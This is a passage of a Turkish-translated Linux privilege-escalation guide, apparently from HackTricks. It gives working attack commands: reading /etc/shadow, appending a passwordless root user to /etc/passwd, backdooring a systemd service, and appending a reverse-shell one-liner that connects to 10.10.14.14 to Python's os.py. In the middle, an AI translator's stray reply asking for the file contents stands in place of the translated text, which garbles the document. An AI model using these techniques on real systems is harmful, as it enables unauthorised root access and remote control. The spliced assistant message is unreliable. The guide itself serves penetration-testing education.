Check **Valentine box from HTB** için bir örneğe bakın.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Eylül 2006 ile 13 Mayıs 2008 arasında Debian tabanlı sistemlerde (Ubuntu, Kubuntu, vb.) üretilen tüm SSL ve SSH anahtarları bu hatadan etkilenmiş olabilir.  
Bu hata, bu işletim sistemlerinde yeni bir ssh anahtarı oluşturulurken ortaya çıkar; çünkü **sadece 32,768 varyasyon mümkündü**. Bu, tüm olasılıkların hesaplanabileceği ve **ssh public key'e sahip olduğunuzda karşılık gelen private key'i arayabileceğiniz** anlamına gelir. Hesaplanmış olasılıkları burada bulabilirsiniz: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH İlginç yapılandırma değerleri

- **PasswordAuthentication:** Parola doğrulamasına izin verilip verilmediğini belirtir. Varsayılan `no`.
- **PubkeyAuthentication:** Public key doğrulamasına izin verilip verilmediğini belirtir. Varsayılan `yes`.
- **PermitEmptyPasswords**: Parola doğrulaması izinliyse, sunucunun boş parola dizisine sahip hesaplara girişe izin verip vermediğini belirtir. Varsayılan `no`.

### PermitRootLogin

root'un ssh ile giriş yapıp yapamayacağını belirtir, varsayılan `no`. Olası değerler:

- `yes`: root password ve private key ile giriş yapabilir
- `without-password` or `prohibit-password`: root yalnızca private key ile giriş yapabilir
- `forced-commands-only`: root yalnızca private key ile ve komut seçenekleri belirtilmişse giriş yapabilir
- `no` : root girişine izin vermez

### AuthorizedKeysFile

Kullanıcı doğrulaması için kullanılabilecek public key'leri içeren dosyaları belirtir. `%h` gibi token'lar içerebilir; bu token'lar home dizini ile değiştirilir. **Mutlak yollar belirtebilirsiniz** (başlangıcı `/` olan) veya **kullanıcının home'undan göreli yollar**. Örneğin:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Bu yapılandırma, eğer kullanıcı "**testusername**"ın **private** anahtarıyla giriş yapmaya çalışırsanız, ssh'in anahtarınızın public anahtarını `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` içindeki anahtarlarla karşılaştıracağını belirtir.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, sunucunuzda (parolasız!) anahtarlar bırakmak yerine **use your local SSH keys instead of leaving keys** kullanmanıza olanak tanır. Böylece, ssh ile bir **to a host** **jump** yapabilir ve oradan başka bir **jump to another** host'a, **initial host**'unuzda bulunan **key**'i **using** ederek erişebilirsiniz.

Bu seçeneği `$HOME/.ssh.config` içinde şu şekilde ayarlamanız gerekir:
```
Host example.com
ForwardAgent yes
```
Dikkat: eğer `Host` `*` ise, kullanıcı her farklı makineye geçtiğinde o host anahtarlara erişebilecektir (bu bir güvenlik sorunudur).

The file `/etc/ssh_config` bu seçenekleri **geçersiz kılabilir** ve bu yapılandırmaya izin verebilir veya engelleyebilir.\
The file `/etc/sshd_config` `AllowAgentForwarding` anahtarıyla ssh-agent forwarding'e **izin verebilir** veya **engelleyebilir** (varsayılan izin ver).

Eğer bir ortamda Forward Agent'in yapılandırıldığını görürseniz aşağıdaki sayfayı okuyun çünkü **bunu kötüye kullanarak ayrıcalıkları yükseltebilirsiniz**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profil dosyaları

The file `/etc/profile` and the files under `/etc/profile.d/` are **kullanıcı yeni bir shell çalıştırdığında yürütülen script'lerdir**. Bu nedenle, bunların herhangi birini **yazabiliyor veya değiştirebiliyorsanız ayrıcalıkları yükseltebilirsiniz**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Herhangi bir garip profile scripti bulunursa, **hassas detaylar** için kontrol etmelisiniz.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir isimle olabilir veya bir yedeği bulunabilir. Bu nedenle **hepsini bulun** ve dosyaları **okuyup okuyamayacağınızı kontrol edin**, dosyaların içinde **hashes** olup olmadığını görmek için:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Bazı durumlarda `/etc/passwd` (veya eşdeğeri) dosyasında **password hashes** bulabilirsiniz.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Yazılabilir /etc/passwd

İlk olarak, aşağıdaki komutlardan biriyle bir parola oluşturun.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the file contents yet. Please paste the contents of src/linux-hardening/privilege-escalation/README.md so I can translate it to Turkish while preserving all markdown/html tags, links and paths.

Also confirm these details for adding the user `hacker` and the generated password:
- Do you want me to generate a strong password now (I can produce a random 16-character password with letters, digits and symbols)?
- Should the password be included in plaintext in the translated README, or should I include only the command to set it (e.g., using chpasswd) or a hashed password?

Once you confirm and provide the README content, I'll return the translated file with the requested user/password section added.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Örnek: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `su` komutunu `hacker:hacker` ile kullanabilirsiniz

Alternatif olarak, parola olmadan sahte bir kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\ UYARI: bu makinenin mevcut güvenliğini zayıflatabilirsiniz.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOT: BSD platformlarında `/etc/passwd` `/etc/pwd.db` ve `/etc/master.passwd` konumunda bulunur, ayrıca `/etc/shadow` `/etc/spwd.db` olarak yeniden adlandırılmıştır.

Bazı hassas dosyalara **yazıp yazamayacağınızı** kontrol etmelisiniz. Örneğin, bir **servis yapılandırma dosyasına** yazabilir misiniz?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Örneğin, makinede bir **tomcat** sunucusu çalışıyorsa ve **/etc/systemd/ içinde Tomcat servis yapılandırma dosyasını değiştirebiliyorsanız,** o zaman aşağıdaki satırları değiştirebilirsiniz:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor'unuz, tomcat bir sonraki başlatıldığında çalıştırılacak.

### Check Folders

Aşağıdaki klasörler yedekler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız ama yine de deneyin)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Garip Konum/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Son birkaç dakika içinde değiştirilen dosyalar
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB dosyaları
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyalar
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Gizli dosyalar
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH'teki Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web dosyaları**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Yedekler**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Known files containing passwords

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)'in kodunu inceleyin, bu **passwords içerebilecek birkaç olası dosyayı** arar.\
**Başka ilginç bir araç** olarak kullanabileceğiniz araç: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — Windows, Linux & Mac için bir yerel bilgisayarda saklanan çok sayıda **passwords**'i çıkarmak için kullanılan açık kaynaklı bir uygulamadır.

### Logs

Eğer **logs**'u okuyabiliyorsanız, içinde **ilginç/gizli bilgiler** bulabilirsiniz. Log ne kadar garipse, o kadar ilginç olacaktır (muhtemelen).\
Ayrıca, bazı "**bad**" yapılandırılmış (backdoored?) **audit logs** bu yazıda açıklandığı gibi audit logs içine **record passwords** kaydetmenize izin verebilir: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**Günlükleri okumak için** [**adm**](interesting-groups-linux-pe/index.html#adm-group) grubu gerçekten yardımcı olacaktır.

### Shell dosyaları
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Ayrıca dosya adında veya içeriğinde "**password**" kelimesi geçen dosyaları ve loglar içindeki IPs ve emails ile hashes regexps'lerini kontrol etmelisiniz.\
Burada bunların hepsinin nasıl yapılacağını listelemeyeceğim ama ilgileniyorsanız [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından yapılan son kontrolleri inceleyebilirsiniz.

## Yazılabilir dosyalar

### Python library hijacking

Eğer bir python scriptinin nereden çalıştırılacağını biliyorsanız ve o klasöre **yazabiliyor** ya da **python kütüphanelerini değiştirebiliyorsanız**, OS kütüphanesini değiştirip backdoorlayabilirsiniz (python scriptinin çalıştırılacağı yere yazabiliyorsanız, os.py kütüphanesini kopyalayıp yapıştırın).

Kütüphaneyi **backdoor the library** yapmak için os.py kütüphanesinin sonuna aşağıdaki satırı ekleyin (IP ve PORT'u değiştirin):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` içindeki bir zafiyet, bir log dosyası veya üst dizinlerinde **write permissions** olan kullanıcıların potansiyel olarak ayrıcalık yükseltmesine yol açabilir. Bunun nedeni, sıklıkla **root** olarak çalışan `logrotate`'in özellikle _**/etc/bash_completion.d/**_ gibi dizinlerde keyfi dosyalar çalıştırılacak şekilde manipüle edilebilmesidir. İzinleri sadece _/var/log_ içinde değil, log rotasyonu uygulanan her dizinde kontrol etmek önemlidir.

> [!TIP]
> Bu zafiyet `logrotate` sürüm `3.18.0` ve daha eski sürümleri etkiler

Zafiyet hakkında daha detaylı bilgi şu sayfada bulunabilir: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Bu zafiyeti [**logrotten**](https://github.com/whotwagner/logrotten) ile kötüye kullanabilirsiniz.

Bu zafiyet [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** ile çok benzerdir; bu yüzden logları değiştirebildiğinizi her bulduğunuzda, bu logları kimin yönettiğini ve logları symlink ile değiştirerek ayrıcalık yükseltmesi yapıp yapamayacağınızı kontrol edin.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Herhangi bir nedenle bir kullanıcı _/etc/sysconfig/network-scripts_ dizinine bir `ifcf-<whatever>` scripti **write** edebiliyorsa **veya** mevcut bir scripti **adjust** edebiliyorsa, sisteminiz **pwned** demektir.

Network scriptleri, örneğin _ifcg-eth0_, ağ bağlantıları için kullanılır. Tam olarak .INI dosyalarına benzerler. Ancak Linux'ta Network Manager (dispatcher.d) tarafından \~sourced\~ edilirler.

Benim durumumda, bu network scriptlerindeki `NAME=` ataması doğru şekilde işlenmiyor. Eğer isimde **white/blank space** varsa sistem boşluktan sonraki kısmı çalıştırmaya çalışıyor. Bu demektir ki, **ilk boşluktan sonraki her şey root olarak çalıştırılıyor**.

Örneğin: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network ile /bin/id_ arasındaki boşluğa dikkat_)

### **init, init.d, systemd, and rc.d**

Dizin `/etc/init.d`, System V init (SysVinit) için **scripts** barındırır; klasik Linux servis yönetim sistemidir. Bu dizin, servisleri `start`, `stop`, `restart` ve bazen `reload` etmek için kullanılan scriptleri içerir. Bu scriptler doğrudan çalıştırılabilir veya `/etc/rc?.d/` içindeki sembolik linkler aracılığıyla tetiklenebilir. Redhat sistemlerinde alternatif bir yol `/etc/rc.d/init.d`'dir.

Öte yandan, `/etc/init` **Upstart** ile ilişkilidir; Ubuntu tarafından tanıtılan daha yeni bir **service management** olup servis yönetimi görevleri için yapılandırma dosyaları kullanır. Upstart'a geçişe rağmen, Upstart içindeki uyumluluk katmanı nedeniyle SysVinit scriptleri hâlâ birlikte kullanılmaktadır.

**systemd**, talep üzerine daemon başlatma, automount yönetimi ve sistem durumu snapshot'ları gibi gelişmiş özellikler sunan modern bir init ve service manager olarak öne çıkar. Dosyaları dağıtım paketleri için `/usr/lib/systemd/` ve yönetici değişiklikleri için `/etc/systemd/system/` içine düzenleyerek sistem yönetimini sadeleştirir.

## Diğer Hileler

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting framework'leri genellikle bir syscall'i hook'layarak kernel ayrıcalıklı işlevselliğini userspace bir manager'a açarlar. Zayıf manager doğrulaması (ör. FD-sırasına dayalı signature kontrolleri veya zayıf parola şemaları) yerel bir uygulamanın manager'ı taklit etmesine ve zaten root'lanmış cihazlarda root'a yükselmesine olanak verebilir. Daha fazlasını ve exploit detaylarını burada öğrenin:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations içindeki regex tabanlı service discovery, proses komut satırlarından bir ikili dosya yolu çıkarıp bunu ayrıcalıklı bir bağlamda -v ile çalıştırabilir. İzin verici desenler (ör. \S kullanımı) yazılabilir konumlardaki (ör. /tmp/httpd) saldırgan tarafından yerleştirilmiş dinleyicilerle eşleşebilir ve bunun sonucunda root olarak yürütmeye yol açabilir (CWE-426 Untrusted Search Path).

Daha fazlasını ve diğer discovery/monitoring yığınlarına uygulanabilecek genelleştirilmiş bir kalıbı burada görün:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux ve macOS'ta kernel açıklarını listeleyen araç [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
